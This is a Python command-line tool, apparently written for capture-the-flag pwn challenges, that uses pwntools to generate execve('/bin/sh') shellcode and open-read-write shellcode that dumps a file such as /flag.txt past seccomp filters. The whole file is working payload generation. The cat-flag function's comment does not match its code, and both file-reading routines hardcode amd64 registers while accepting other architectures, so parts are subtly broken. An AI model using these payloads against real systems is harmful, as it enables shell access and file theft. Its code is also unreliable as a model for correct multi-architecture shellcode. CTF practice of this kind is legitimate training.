#!/usr/bin/env python3
"""
shellcode_helper.py -- Generate common shellcode payloads for pwn challenges
using pwntools' `asm()`, with context switching for arch/os.

Requires: pip install pwntools

Usage:
    python3 shellcode_helper.py execve --arch amd64
    python3 shellcode_helper.py execve --arch i386
    python3 shellcode_helper.py cat-flag --arch amd64 --path /flag.txt
    python3 shellcode_helper.py orw --arch amd64 --path /flag.txt   # open-read-write
"""
import argparse
from pwn import asm, context, shellcraft


def execve_shell(arch="amd64", os_name="linux"):
    context.clear(arch=arch, os=os_name)
    code = shellcraft.sh()
    raw = asm(code)
    print(f"[*] execve('/bin/sh') shellcode ({arch}), {len(raw)} bytes:")
    print(raw.hex())
    return raw


def cat_flag_shellcode(path="/flag.txt", arch="amd64", os_name="linux"):
    context.clear(arch=arch, os=os_name)
    # Spawn a shell that cats the flag directly -- simpler than manual ORW when
    # the challenge allows execve of arbitrary commands
    code = shellcraft.sh() if not path else f'''
    /* open, read, write flag file */
    {shellcraft.open(path, 0, 0)}
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    {shellcraft.syscall('SYS_read')}
    mov rdx, rax
    mov rsi, rsp
    mov rdi, 1
    {shellcraft.syscall('SYS_write')}
    '''
    raw = asm(code)
    print(f"[*] Cat-flag shellcode targeting {path} ({arch}), {len(raw)} bytes:")
    print(raw.hex())
    return raw


def orw_shellcode(path="/flag.txt", arch="amd64", os_name="linux"):
    """Open-Read-Write shellcode -- standard pattern for challenges with
    execve disabled via seccomp (common in modern pwn challenges)."""
    context.clear(arch=arch, os=os_name)
    code = f'''
    {shellcraft.open(path, 0, 0)}
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x200
    {shellcraft.syscall('SYS_read')}
    mov rdx, rax
    mov rsi, rsp
    mov rdi, 1
    {shellcraft.syscall('SYS_write')}
    {shellcraft.exit(0)}
    '''
    raw = asm(code)
    print(f"[*] ORW shellcode targeting {path} ({arch}), {len(raw)} bytes:")
    print(raw.hex())
    return raw


def check_seccomp_note():
    print("[i] If the binary has a seccomp-bpf filter (common in modern pwn),")
    print("    check allowed syscalls first with `seccomp-tools dump ./chall`.")
    print("    execve is frequently blocked -- use ORW shellcode instead.")


def main():
    ap = argparse.ArgumentParser(description="Shellcode generator for pwn challenges")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_exec = sub.add_parser("execve")
    p_exec.add_argument("--arch", default="amd64", choices=["amd64", "i386", "arm", "aarch64"])

    p_cat = sub.add_parser("cat-flag")
    p_cat.add_argument("--arch", default="amd64")
    p_cat.add_argument("--path", default="/flag.txt")

    p_orw = sub.add_parser("orw")
    p_orw.add_argument("--arch", default="amd64")
    p_orw.add_argument("--path", default="/flag.txt")

    sub.add_parser("seccomp-note")

    args = ap.parse_args()

    if args.cmd == "execve":
        execve_shell(args.arch)
    elif args.cmd == "cat-flag":
        cat_flag_shellcode(args.path, args.arch)
    elif args.cmd == "orw":
        orw_shellcode(args.path, args.arch)
    elif args.cmd == "seccomp-note":
        check_seccomp_note()


if __name__ == "__main__":
    main()
